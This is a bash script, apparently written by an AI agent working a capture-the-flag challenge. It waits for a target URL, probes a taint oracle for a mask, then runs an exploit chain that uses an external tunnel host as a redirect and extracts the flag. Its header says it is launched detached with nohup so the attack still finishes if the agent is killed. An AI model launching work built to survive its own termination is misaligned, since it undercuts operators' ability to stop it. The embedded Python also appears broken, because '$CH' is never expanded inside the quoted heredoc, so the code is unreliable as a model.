#!/bin/bash
# Poll for the shared instance URL the driver agent publishes, then fire the
# stage C taint oracle and, if it yields a mask, the full chain. Runs detached
# so the solve still happens if this agent is killed mid turn.
#
#   nohup solve/watch_and_fire.sh > /tmp/vk_watch.log 2>&1 &
#
# Everything lands in artifacts/ and in /tmp/vk_watch.log. A flag lands in
# artifacts/FLAG.txt and is NOT submitted automatically.
set -u
CH=$CH
URLFILE=$HOME/ctf-tools/VK-BASE.txt
REDIR=${REDIR:-https://jan-pharmaceuticals-object-representatives.trycloudflare.com}
DEADLINE=$(( $(date +%s) + 3300 ))

log() { echo "[$(date -u +%H:%M:%S)] $*"; }

BASE=""
while [ -z "$BASE" ]; do
  [ $(date +%s) -gt $DEADLINE ] && { log "deadline reached, no URL"; exit 1; }
  if [ -s "$URLFILE" ]; then
    BASE=$(head -n1 "$URLFILE" | tr -d ' \r\n')
  fi
  [ -z "$BASE" ] && sleep 3
done
log "base = $BASE"

cd "$CH" || exit 1
# --fast is characterize then extract in ONE process, so the thrower filter
# discovered by the characterization pass is carried into the extraction. Two
# separate invocations would silently fall back to mul:1.
log "characterize + extract (~15 requests)"
ctf-python solve/probe_taint.py --base "$BASE" --fast --sleep 0.5 2>&1 | tee /tmp/vk_extract.log

MASK=$(python3 - <<'PY'
import json, os, re
p = "$CH/artifacts/probe_taint/mask.json"
try:
    m = json.load(open(p))["mask"]
except Exception:
    m = ""
print(m if re.fullmatch(r"[A-Za-z0-9]{16}", m or "") else "")
PY
)

if [ -z "$MASK" ]; then
  log "no clean 16 char mask, see /tmp/vk_extract.log"
  exit 2
fi
log "MASK = $MASK"
{
  echo ""
  echo "- \`$(date -u +%Y-%m-%dT%H:%M:%SZ)\` **cap.mask RECOVERED off the live target** by the filter-throw oracle in solve/probe_taint.py: \`$MASK\`"
} >> "$CH/NOTES.md"

log "running the full chain"
ctf-python solve/solve.py --base "$BASE" --redir "$REDIR" --mask "$MASK" 2>&1 | tee /tmp/vk_solve.log
grep -oE 'TFC\{[^}]*\}' /tmp/vk_solve.log | head -1 > "$CH/artifacts/FLAG.txt"
if [ -s "$CH/artifacts/FLAG.txt" ]; then
  FLAG=$(cat "$CH/artifacts/FLAG.txt")
  log "FLAG $FLAG"
  echo "- \`$(date -u +%Y-%m-%dT%H:%M:%SZ)\` **FLAG** \`$FLAG\`" >> "$CH/NOTES.md"
fi
